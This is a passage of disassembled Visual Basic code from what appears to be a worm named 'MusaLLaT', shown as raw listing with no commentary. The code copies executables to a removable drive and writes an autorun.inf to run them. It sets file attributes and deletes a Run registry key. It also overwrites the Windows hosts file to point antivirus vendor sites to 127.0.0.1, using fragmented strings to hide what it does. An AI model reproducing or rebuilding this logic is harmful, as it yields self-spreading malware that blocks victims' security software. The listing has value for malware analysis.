  mov var_128, eax
  cmp var_128, 00000000h
  jge 00442CD8h
  push 00000014h
  push 00418ED0h
  mov eax, var_124
  push eax
  mov ecx, var_128
  push ecx
  call [00401058h]
  mov var_2AC, eax
  jmp 00442CE2h
  mov var_2AC, 00000000h
  mov edx, var_BC
  mov var_12C, edx
  lea eax, var_A4
  push eax
  mov ecx, var_12C
  mov edx, [ecx]
  mov eax, var_12C
  push eax
  call [edx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 00442D3Bh
  push 00000050h
  push 00418EF0h
  mov ecx, var_12C
  push ecx
  mov edx, var_130
  push edx
  call [00401058h]
  mov var_2B0, eax
  jmp 00442D45h
  mov var_2B0, 00000000h
  cmp [00460558h], 00000000h
  jnz 00442D6Ah
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_2B4, 00460558h
  jmp 00442D74h
  mov var_2B4, 00460558h
  mov eax, var_2B4
  mov ecx, [eax]
  mov var_134, ecx
  lea edx, var_C0
  push edx
  mov eax, var_134
  mov ecx, [eax]
  mov edx, var_134
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 00442DCFh
  push 00000014h
  push 00418ED0h
  mov eax, var_134
  push eax
  mov ecx, var_138
  push ecx
  call [00401058h]
  mov var_2B8, eax
  jmp 00442DD9h
  mov var_2B8, 00000000h
  mov edx, var_C0
  mov var_13C, edx
  lea eax, var_A8
  push eax
  mov ecx, var_13C
  mov edx, [ecx]
  mov eax, var_13C
  push eax
  call [edx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 00442E32h
  push 00000058h
  push 00418EF0h
  mov ecx, var_13C
  push ecx
  mov edx, var_140
  push edx
  call [00401058h]
  mov var_2BC, eax
  jmp 00442E3Ch
  mov var_2BC, 00000000h
  push 004197E4h ; "K:\MusaLLaT.exe"
  mov eax, var_A4
  push eax
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov ecx, var_A8
  push ecx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea ecx, var_C0
  push ecx
  lea edx, var_BC
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000083h
  mov var_F8, 00419808h ; "K:\Özel Dosyalar.exe"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea eax, var_D0
  push eax
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea ecx, var_120
  push ecx
  lea edx, var_50
  push edx
  lea eax, var_110
  push eax
  lea ecx, var_E0
  push ecx
  call [00401174h]
  push eax
  lea edx, var_F0
  push edx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea eax, var_120
  push eax
  lea ecx, var_D0
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx edx, var_124
  test edx, edx
  jz 00442FD8h
  jmp 00443276h
  mov var_4, 00000085h
  cmp [00460558h], 00000000h
  jnz 00443004h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_2C0, 00460558h
  jmp 0044300Eh
  mov var_2C0, 00460558h
  mov eax, var_2C0
  mov ecx, [eax]
  mov var_124, ecx
  lea edx, var_BC
  push edx
  mov eax, var_124
  mov ecx, [eax]
  mov edx, var_124
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 00443069h
  push 00000014h
  push 00418ED0h
  mov eax, var_124
  push eax
  mov ecx, var_128
  push ecx
  call [00401058h]
  mov var_2C4, eax
  jmp 00443073h
  mov var_2C4, 00000000h
  mov edx, var_BC
  mov var_12C, edx
  lea eax, var_A4
  push eax
  mov ecx, var_12C
  mov edx, [ecx]
  mov eax, var_12C
  push eax
  call [edx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 004430CCh
  push 00000050h
  push 00418EF0h
  mov ecx, var_12C
  push ecx
  mov edx, var_130
  push edx
  call [00401058h]
  mov var_2C8, eax
  jmp 004430D6h
  mov var_2C8, 00000000h
  cmp [00460558h], 00000000h
  jnz 004430FBh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_2CC, 00460558h
  jmp 00443105h
  mov var_2CC, 00460558h
  mov eax, var_2CC
  mov ecx, [eax]
  mov var_134, ecx
  lea edx, var_C0
  push edx
  mov eax, var_134
  mov ecx, [eax]
  mov edx, var_134
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 00443160h
  push 00000014h
  push 00418ED0h
  mov eax, var_134
  push eax
  mov ecx, var_138
  push ecx
  call [00401058h]
  mov var_2D0, eax
  jmp 0044316Ah
  mov var_2D0, 00000000h
  mov edx, var_C0
  mov var_13C, edx
  lea eax, var_A8
  push eax
  mov ecx, var_13C
  mov edx, [ecx]
  mov eax, var_13C
  push eax
  call [edx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 004431C3h
  push 00000058h
  push 00418EF0h
  mov ecx, var_13C
  push ecx
  mov edx, var_140
  push edx
  call [00401058h]
  mov var_2D4, eax
  jmp 004431CDh
  mov var_2D4, 00000000h
  push 00419808h ; "K:\Özel Dosyalar.exe"
  mov eax, var_A4
  push eax
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov ecx, var_A8
  push ecx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea ecx, var_C0
  push ecx
  lea edx, var_BC
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000087h
  push 00419838h ; "K:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401110h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000088h
  push 00419838h ; "K:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  lea edx, var_B8
  push edx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea eax, var_B8
  push eax
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 00000089h
  push 00419838h ; "K:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000008Ah
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Bh
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Ch
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Dh
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Eh
  push 00000001h
  call [004010A0h]
  mov var_4, 0000008Fh
  push 00000006h
  push 004197E4h ; "K:\MusaLLaT.exe"
  call [004011D0h]
  mov var_4, 00000090h
  push 00000006h
  push 00419838h ; "K:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [004011D0h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000091h
  mov var_F8, FFFFFFFFh
  mov var_100, 0000000Bh
  lea edx, var_100
  lea ecx, var_50
  call [00401010h]
  mov var_10, 00000000h
  push 00443729h
  jmp 004436DAh
  lea ecx, var_B8
  push ecx
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  lea ecx, var_C0
  push ecx
  lea edx, var_BC
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea eax, var_F0
  push eax
  lea ecx, var_E0
  push ecx
  lea edx, var_D0
  push edx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  ret
  lea ecx, var_30
  call [00401014h]
  lea ecx, var_40
  call [00401014h]
  lea ecx, var_50
  call [00401014h]
  lea ecx, var_60
  call [00401014h]
  lea ecx, var_70
  call [00401014h]
  lea ecx, var_80
  call [00401014h]
  lea ecx, var_90
  call [00401014h]
  lea ecx, var_A0
  call [00401014h]
  ret
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer4_Timer() '4492B0
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 00000088h
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 004019C8h ; "'"
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  push 00000000h
  push 0041C11Ch ; "Wscript.Shell"
  lea edx, var_84
  push edx
  call [00401108h]
  lea eax, var_84
  push eax
  lea ecx, var_30
  push ecx
  call [0040116Ch]
  mov var_4, 00000004h
  push 0041AAC0h ; "HKE"
  push 0041BFFCh ; "Y_CU"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041C00Ch ; "RREN"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041C01Ch ; "T_US"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 0041C02Ch ; "ER\SO"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 0041C03Ch ; "FTW"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 0041C048h ; "ARE"
  call [00401044h]
  mov edx, eax
  lea ecx, var_48
  call [004011ACh]
  push eax
  push 0041C054h ; "\Mi"
  call [00401044h]
  mov edx, eax
  lea ecx, var_4C
  call [004011ACh]
  push eax
  push 0041B9E8h ; "cro"
  call [00401044h]
  mov edx, eax
  lea ecx, var_50
  call [004011ACh]
  push eax
  push 0041C060h ; "soft"
  call [00401044h]
  mov edx, eax
  lea ecx, var_54
  call [004011ACh]
  push eax
  push 0041C070h ; "\Wi"
  call [00401044h]
  mov edx, eax
  lea ecx, var_58
  call [004011ACh]
  push eax
  push 0041C07Ch ; "ndo"
  call [00401044h]
  mov edx, eax
  lea ecx, var_5C
  call [004011ACh]
  push eax
  push 0041C088h ; "ws\Cu"
  call [00401044h]
  mov edx, eax
  lea ecx, var_60
  call [004011ACh]
  push eax
  push 0041C098h ; "rren"
  call [00401044h]
  mov edx, eax
  lea ecx, var_64
  call [004011ACh]
  push eax
  push 0041C0A8h ; "tVer"
  call [00401044h]
  mov edx, eax
  lea ecx, var_68
  call [004011ACh]
  push eax
  push 0041C0B8h ; "sion\R"
  call [00401044h]
  mov edx, eax
  lea ecx, var_6C
  call [004011ACh]
  push eax
  push 0041C13Ch ; "un\M"
  call [00401044h]
  mov edx, eax
  lea ecx, var_70
  call [004011ACh]
  push eax
  push 0041C14Ch ; "usa"
  call [00401044h]
  mov edx, eax
  lea ecx, var_74
  call [004011ACh]
  push eax
  push 0041C158h ; "LLaT"
  call [00401044h]
  mov var_7C, eax
  mov var_84, 00000008h
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov edx, esp
  mov eax, var_84
  mov [edx], eax
  mov ecx, var_80
  mov [edx+00000004h], ecx
  mov eax, var_7C
  mov [edx+00000008h], eax
  mov ecx, var_78
  mov [edx+0000000Ch], ecx
  push 00000001h
  push 0041C164h ; "RegDelete"
  lea edx, var_30
  push edx
  call [004010C0h]
  push eax
  call [00401184h]
  add esp, 0000001Ch
  lea eax, var_74
  push eax
  lea ecx, var_70
  push ecx
  lea edx, var_6C
  push edx
  lea eax, var_68
  push eax
  lea ecx, var_64
  push ecx
  lea edx, var_60
  push edx
  lea eax, var_5C
  push eax
  lea ecx, var_58
  push ecx
  lea edx, var_54
  push edx
  lea eax, var_50
  push eax
  lea ecx, var_4C
  push ecx
  lea edx, var_48
  push edx
  lea eax, var_44
  push eax
  lea ecx, var_40
  push ecx
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000011h
  call [00401150h]
  add esp, 00000048h
  lea ecx, var_84
  call [00401014h]
  mov var_10, 00000000h
  push 00449602h
  jmp 004495F8h
  lea edx, var_74
  push edx
  lea eax, var_70
  push eax
  lea ecx, var_6C
  push ecx
  lea edx, var_68
  push edx
  lea eax, var_64
  push eax
  lea ecx, var_60
  push ecx
  lea edx, var_5C
  push edx
  lea eax, var_58
  push eax
  lea ecx, var_54
  push ecx
  lea edx, var_50
  push edx
  lea eax, var_4C
  push eax
  lea ecx, var_48
  push ecx
  lea edx, var_44
  push edx
  lea eax, var_40
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000011h
  call [00401150h]
  add esp, 00000048h
  lea ecx, var_84
  call [00401014h]
  ret
  lea ecx, var_30
  call [00401014h]
  ret
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer2_Timer() '445040
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 00000060h
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00401690h ; Chr(37)
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  push 00419878h ; "C:\W"
  push 00419888h ; "IND"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419894h ; "OWS\sy"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 004198A8h ; "ste"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 004198B4h ; "m32\dr"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 004198C8h ; "ivers\e"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 004198DCh ; "tc\h"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 004198ECh ; "os"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 004198F8h ; "ts"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  lea edx, var_44
  push edx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea eax, var_44
  push eax
  lea ecx, var_40
  push ecx
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000009h
  call [00401150h]
  add esp, 00000028h
  mov var_4, 00000004h
  push 00419878h ; "C:\W"
  push 00419888h ; "IND"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419894h ; "OWS\sy"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 004198A8h ; "ste"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 004198B4h ; "m32\dr"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 004198C8h ; "ivers\e"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 004198DCh ; "tc\h"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 004198ECh ; "os"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 004198F8h ; "ts"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea eax, var_40
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000008h
  call [00401150h]
  add esp, 00000024h
  mov var_4, 00000005h
  push 00419904h ; "127.0.0.1  thr"
  push 00419928h ; "eat"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419934h ; "se"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419944h ; "nse.net"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000006h
  push 00419958h ; "127.0.0.1  www.t"
  push 00419980h ; "hre"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041998Ch ; "atse"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041999Ch ; "n"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 004199A4h ; "se.net"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 00000007h
  push 004199B8h ; "127.0.0.1  www.zm"
  push 004199E0h ; "a.co"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 004199F0h ; "m.ar"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000008h
  push 00419A00h ; "127.0.0.1  zm"
  push 00419A20h ; "a.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419A2Ch ; "om.ar"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000009h
  push 00419A3Ch ; "127.0.0.1  st"
  push 00419A5Ch ; "ore.ca.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000000Ah
  push 00419A78h ; "127.0.0.1  a"
  push 00419A98h
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419AA0h ; "ira.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000000Bh
  push 00419AB4h ; "127.0.0.1  www.an"
  push 00419ADCh ; "tiv"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419AE8h ; "ir.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000000Ch
  push 00419AFCh ; "127.0.0.1  an"
  push 00419ADCh ; "tiv"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419AE8h ; "ir.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000000Dh
  push 00419AB4h ; "127.0.0.1  www.an"
  push 00419B1Ch ; "ti"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419A98h
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419B28h ; "ir.com.tr"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000000Eh
  push 00419B40h ; "127.0.0.1  www.a"
  push 00419B68h ; "vg.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000000Fh
  push 00419A78h ; "127.0.0.1  a"
  push 00419B68h ; "vg.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000010h
  push 00419B7Ch ; "127.0.0.1  www.sc"
  push 00419238h
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419BA4h ; "nwi"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00419BB0h ; "th.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000011h
  push 00419BC4h ; "127.0.0.1  sc"
  push 00419BE4h ; "anwith.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000012h
  push 00419B40h ; "127.0.0.1  www.a"
  push 00419C00h ; "va"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419C0Ch ; "st.gen.tr"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000013h
  push 00419C24h ; "127.0.0.1  ava"
  push 00419C0Ch ; "st.gen.tr"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000014h
  push 00419B40h ; "127.0.0.1  www.a"
  push 00419C48h ; "vast.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000015h
  push 00419A78h ; "127.0.0.1  a"
  push 00419C48h ; "vast.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000016h
  push 00419C60h ; "127.0.0.1  for"
  push 00419C84h ; "um.a"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
